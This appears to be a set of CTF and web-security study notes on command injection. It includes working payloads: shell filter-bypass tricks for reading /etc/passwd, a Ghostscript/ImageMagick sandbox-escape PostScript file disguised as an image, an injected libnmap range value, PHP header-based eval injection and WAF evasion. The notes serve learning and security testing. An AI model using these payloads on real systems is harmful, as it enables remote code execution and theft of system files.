# Command injection  
1. [ghostscript RCE](#ghostscript-rce)  
2. [Command Injection in libnmap](#command-injection-in-libnmap-<nodejs>)  
3. [Dangerous use of php functions](#dangerous-use-of-php-function)  
4. [Bypass with Uninitialized Variable in PHP](#bypass-with-uninitialized-variable-in-php)  

In CTF, we can directly cat flag with cmd injection. In real world, we can directly make a reverse shell with it.  
First, we can take a look at the power of wildcard...  
```php
// match one character
cat fla?
cat ./???sword

// match multiple character
cat f*

// bypass the limit on space character
cat${IFS}flag
cat$IFSflag

// borrow from env variable
// Windows: start from a count for b
%comspec:~a,b%
Linux: ${PATH:a:b}

// ${a} become empty which can be ignored
c${a}a''t /et``c/pa""ss${aa}wd
```

## ghostscript RCE
The sandbox `-dSAFER` of ghostscript has been bypassed! The sandbox is controlled by the `LockSafetyParams` param in the process, then `restore` of gs can overwrite the the param. Many application based on ghostscript would be influenced, such as the most famous application imageMagick. Following is the payload of POC.jpg:  
```php
%!PS
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%id) currentdevice putdeviceprops
```  
Here, you can also forge it as gif with `gif89` header to deceive the file upload system.  
❗️ Attention: The timing to trigger the RCE is important.  

Others from `convert xxx.jpg xxx` can trigger the RCE, someone found that `less .jpg` can also trigger it. But why?  
```php
strace -f -o trace_result.txt less xxx.jpg

// one is suspicious
execve("/bin/sh", ["sh", "-c", "/usr/bin/lesspipe.sh xxx.jpg"], [/* 10 vars */]) = 0
```  
Then we can find something in the `lesspipe.sh`, it use `identify` command of ImageMagick to output the information of jpeg.  
[ref: mail of Tavis](http://openwall.com/lists/oss-security/2018/08/21/2)  
[ref: security team of imageMagick](https://imagetragick.com/)  
[ref: PostScript语言安全研究](https://paper.seebug.org/68/#0x03-ghostscriptimagemagick)  
[ref: ImageMagick-CVE-2016-3714](http://www.zerokeeper.com/vul-analysis/ImageMagick-CVE-2016-3714.html)  
[ref: 安全客ghostscript命令执行漏洞预警](https://www.anquanke.com/post/id/157513)  
[用二進制的方式fuzzing ImageMagick漏洞](https://github.com/lcatro/Fuzzing-ImageMagick/blob/master/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8Fuzzing%E6%8C%96%E6%8E%98ImageMagick%E7%9A%84%E6%BC%8F%E6%B4%9E.md)  

## Command Injection in libnmap <Nodejs>
libnmap is the third party module for nodejs to access nmap. If attacker can control the scanned range of ip, it might cause to command injection.  
```js
range:[
	"a.b.$(id)"
]
```  
A very simple vulnerability  
[Hackerone report](https://hackerone.com/reports/390865)  

## Dangerous use of php function
1. `getallheaders()`  
[PHP Manual](http://php.net/manual/en/function.getallheaders.php)  
This function can get all the http headers. Command injection can be done with `eval(getallheaders)` and code injection in headers.  
2. `get_defined_vars()`  
[PHP Manual](http://php.net/manual/en/function.get-defined-vars.php)  
Same concept, but `reset` first would be helpful.  
[More detail to find here](http://blog.1pwnch.com/ctf/websecurity/2018/11/26/Code-Breaking-Puzzles/#easy---phplimit)  

Be careful, if the return data of the function is other type instead of string (e.g. array, object). We can use `implode()` to concate all the data to a string in advance.  

## Bypass with Uninitialized Variable in PHP  
`$u` would be parsed to empty string in bash, but parsed as original string to bypass the waf  
```php
cat$u /etc$u/passwd$u
```  
[Web Application Firewall (WAF) Evasion Techniques #3](https://www.secjuice.com/web-application-firewall-waf-evasion/)
